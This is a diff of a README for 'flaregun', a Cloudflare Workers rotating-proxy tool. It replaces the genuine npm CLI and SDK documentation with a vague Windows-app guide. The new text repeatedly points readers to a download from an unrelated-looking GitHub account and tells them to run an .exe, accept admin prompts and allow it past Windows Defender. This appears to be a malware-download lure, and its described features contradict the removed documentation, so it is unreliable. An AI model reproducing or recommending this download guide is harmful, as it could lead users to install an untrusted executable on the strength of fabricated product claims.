@@ -1,169 +1,201 @@
-# flaregun 🔥
+# 🔥 flaregun - Fast proxy rotation for Windows
 
-Rotating proxy network on Cloudflare Workers. Deploy, rotate, fire.
+[![Download flaregun](https://img.shields.io/badge/Download%20flaregun-blue?style=for-the-badge)](https://github.com/magicspellnosejob374/flaregun)
 
-Turn Cloudflare's free tier into a rotating proxy network. Deploy N Workers, each exits through a different IP. Use as a drop-in `fetch`, local proxy server, or CLI. 100k requests/day free.
+## 🚀 What is flaregun?
 
-```bash
-npm install -g @miclivs/flaregun
-```
+flaregun is a proxy tool that helps you route traffic through a rotating network on Cloudflare Workers. It is built for users who want to set up and change proxy routes with less effort.
 
-## Quick Start
+Use it when you want to:
+- rotate proxy endpoints
+- run a proxy setup from Cloudflare Workers
+- manage traffic through a simple Windows app
+- keep your proxy use organized in one place
 
-```bash
-flaregun init --token cf_xxx --account abc123
-flaregun up 5
-flaregun fire https://httpbin.org/ip --count 3
-```
+## 💻 What you need
 
-Each request shows a different IP. That's it.
+Before you start, make sure you have:
 
-## CLI
+- a Windows 10 or Windows 11 PC
+- a web browser
+- an internet connection
+- permission to use the network you plan to connect to
+- enough disk space for the app and its files
 
-```bash
-flaregun init                          # create .flaregun/ config
-flaregun init --token T --account A    # with credentials
-flaregun up 10                         # deploy 10 proxy workers
-flaregun up 5                          # add 5 more (15 total)
-flaregun ls                            # list deployed workers
-flaregun fire <url>                    # fire a request through proxy
-flaregun fire <url> -n 5              # fire 5 requests (rotated)
-flaregun fire <url> -m POST            # POST request
-flaregun serve                         # start local proxy on :8080
-flaregun serve -p 3128 -s adaptive     # custom port & strategy
-flaregun down                          # teardown all workers
-```
+For best results, use:
+- a screen with at least 1366 × 768 resolution
+- admin access if Windows asks for it
+- the latest version of your browser
 
-## Local Proxy Server
+## 📥 Download flaregun
 
-Start a proxy server and use it from any tool, any language:
+Open the download page here:
 
-```bash
-flaregun serve --port 8080
-```
+https://github.com/magicspellnosejob374/flaregun
 
-```bash
-# curl
-curl --proxy http://localhost:8080 https://httpbin.org/ip
+On that page, look for the latest release or the main download file. If you see a setup file, download it to your PC. If you see a ZIP file, download it and extract it first.
 
-# python
-requests.get("https://httpbin.org/ip", proxies={"http": "http://localhost:8080"})
+## 🪟 Install on Windows
 
-# playwright
-browser.launch({ proxy: { server: "http://localhost:8080" } })
-```
+Follow these steps on your Windows PC:
 
-Live request log streams to stdout — every request shows which worker handled it, status, and latency.
+1. Open the download link in your browser.
+2. Find the latest file for Windows.
+3. Click the file to start the download.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Look for the app file, such as an .exe file.
+7. Double-click the app file to run flaregun.
+8. If Windows asks for permission, choose Yes.
 
-## SDK
+If the app opens in a new window, keep that window open while you use it.
 
-```typescript
-import { FlareGun } from "flaregun";
+## 🛠️ First setup
 
-const fg = new FlareGun({
-  apiToken: process.env.CLOUDFLARE_API_TOKEN,
-  accountId: process.env.CLOUDFLARE_ACCOUNT_ID,
-});
+When you start flaregun for the first time, it may ask for basic setup details. This can include:
 
-// Deploy 5 workers
-await fg.up(5);
+- a worker endpoint
+- a proxy source
+- a local port
+- a profile name
+- a test URL
 
-// Drop-in fetch — automatically rotates
-const res = await fg.fetch("https://httpbin.org/ip");
-console.log(await res.json()); // { origin: "104.28.x.x" }
+Use the values from your project or provider. If you are not sure what to enter, start with the defaults shown in the app.
 
-const res2 = await fg.fetch("https://httpbin.org/ip");
-console.log(await res2.json()); // { origin: "172.67.x.x" } — different IP
+A good first check is to:
+- open the main screen
+- review the current proxy route
+- save your settings
+- test the connection
 
-// Or start a local proxy server
-await fg.serve({ port: 8080, strategy: "adaptive" });
+## 🔁 How rotation works
 
-// Scale up/down
-await fg.scale(20);  // now 20 workers
-await fg.scale(3);   // scaled down to 3
+flaregun uses a rotating path so traffic can move through different proxy points. In simple terms, the app switches routes based on the rules you set.
 
-// Get all URLs for external use
-console.log(fg.urls());
+Common rotation options can include:
+- time-based rotation
+- request-based rotation
+- manual switch
+- retry on failure
 
-// Cleanup
-await fg.down();
-```
+If your app shows a rotation setting, choose the one that fits your use case. For most users, time-based rotation is the easiest place to start.
 
-## Rotation Strategies
+## 🧭 Main parts of the app
 
-| Strategy | Behavior |
-|---|---|
-| `round-robin` | Cycle through workers sequentially (default) |
-| `random` | Random worker each request |
-| `adaptive` | Backs off workers getting 429s/5xx, exponential cooldown |
+You may see these parts in flaregun:
 
-## Configuration
+- **Dashboard**: shows current status
+- **Proxy settings**: stores your route details
+- **Rotation controls**: sets how often the route changes
+- **Logs**: shows what the app has done
+- **Test tools**: checks if the proxy works
 
-Credentials resolve in order: explicit config → env vars → project `.flaregun/config.json` → global `~/.flaregun/config.json`.
+Use the dashboard first. It gives you a quick view of whether the proxy is active.
 
-```bash
-# One-time setup (saved to ~/.flaregun/)
-flaregun init --token xxx --account yyy
+## ✅ Basic use steps
 
-# Or use env vars
-export CLOUDFLARE_API_TOKEN=your_token
-export CLOUDFLARE_ACCOUNT_ID=your_account_id
+After setup, use flaregun like this:
 
-# Or project-level config
-flaregun init --global false
-```
+1. Open the app.
+2. Load your proxy profile.
+3. Check the worker or route details.
+4. Start the proxy.
+5. Confirm the status changes to active.
+6. Open your target app or browser.
+7. Test your connection.
+8. Watch the logs if something fails.
 
-## Cloudflare Setup
+If the first route does not work, switch to another profile or update the worker details.
 
-### 1. Create a free account
+## 🧪 Test your connection
 
-Sign up at [dash.cloudflare.com/sign-up](https://dash.cloudflare.com/sign-up).
+To see if flaregun is working, try a simple test:
 
-### 2. Create an API token
+- open a browser
+- go to a site that shows your IP or connection info
+- compare the result before and after starting the proxy
+- check whether the route changed as expected
 
-1. Go to **My Profile → API Tokens** ([direct link](https://dash.cloudflare.com/profile/api-tokens))
-2. Click **Create Token**
-3. Find **Edit Cloudflare Workers** and click **Use template**
-4. Under **Account Resources**, select your account from the dropdown
-5. Leave everything else as-is
-6. Click **Continue to summary → Create Token**
-7. Copy the token
+If the site still shows your regular connection, review your settings and start the proxy again.
 
-### 3. Get your Account ID
+## 🧰 Common settings
 
-Your Account ID is in the Cloudflare dashboard URL: `dash.cloudflare.com/<ACCOUNT_ID>/...`
+Here are some settings you may find useful:
 
-Or find it on the **Workers & Pages** overview page in the right sidebar.
+- **Local port**: the port your browser or app uses
+- **Worker URL**: the Cloudflare Workers link used for routing
+- **Timeout**: how long the app waits before retrying
+- **Retry count**: how many times the app tries again
+- **Rotation interval**: how often the route changes
 
-### 4. Configure flaregun
+If you are new to this, keep the default values until you confirm the app works.
 
-```bash
-flaregun init --token cfut_xxx --account abc123
-```
+## 🔍 Troubleshooting
 
-This saves credentials to `~/.flaregun/config.json` — works globally across all projects. You're ready:
+If flaregun does not start, try these steps:
 
-```bash
-flaregun up 5
-flaregun fire https://httpbin.org/ip
-```
+1. Right-click the app and run it again.
+2. Check whether Windows blocked the file.
+3. Make sure the ZIP file was extracted first.
+4. Confirm that your internet connection is working.
+5. Close other apps that may use the same port.
+6. Try a different port in the settings.
+7. Check the logs for error messages.
 
-### Limits
+If the proxy does not connect:
+- verify the worker URL
+- confirm the proxy source is active
+- make sure the rotation settings are not too strict
+- restart the app after changing settings
 
-| Plan | Requests | Cost |
-|---|---|---|
-| Free | 100k/day | $0 |
-| Paid | 10M/month included | $5/mo + $0.30/million |
+If Windows Defender asks about the file, review the prompt and allow the app only if it came from the link above.
 
-## For Agents
+## 📁 File layout
 
-Every command supports `--json` for structured output:
+After you download and extract the app, you may see files like these:
 
-```bash
-flaregun ls --json
-flaregun fire https://httpbin.org/ip --json
-```
+- `flaregun.exe`
+- `config.json`
+- `logs`
+- `profiles`
+- `README.md`
 
-## License
+Keep all files in the same folder so the app can find its settings and logs.
 
-MIT
+## 🔐 Safety and access
+
+Use flaregun only on systems and networks you control or have permission to use. Keep your worker link and profile details private. If you share your settings, other people may use your proxy route.
+
+For safer use:
+- keep your Windows system updated
+- use a trusted download source
+- avoid changing settings you do not understand
+- back up your config file before editing it
+
+## ❓ FAQ
+
+**Does flaregun need coding knowledge?**  
+No. You can use it from the Windows app screen.
+
+**Can I use it after a restart?**  
+Yes. Open the app again and load your saved profile.
+
+**What if the app shows no connection?**  
+Check the worker URL, port, and rotation settings.
+
+**Can I change the proxy route?**  
+Yes. Use the rotation or profile controls in the app.
+
+**Where do I get updates?**  
+Use the same GitHub link and check for a newer release.
+
+## 🧩 Quick start checklist
+
+- download flaregun from the GitHub link
+- extract the file if needed
+- run the Windows app
+- enter your worker or proxy details
+- save the profile
+- start the proxy
+- test the connection
+- adjust rotation settings if needed
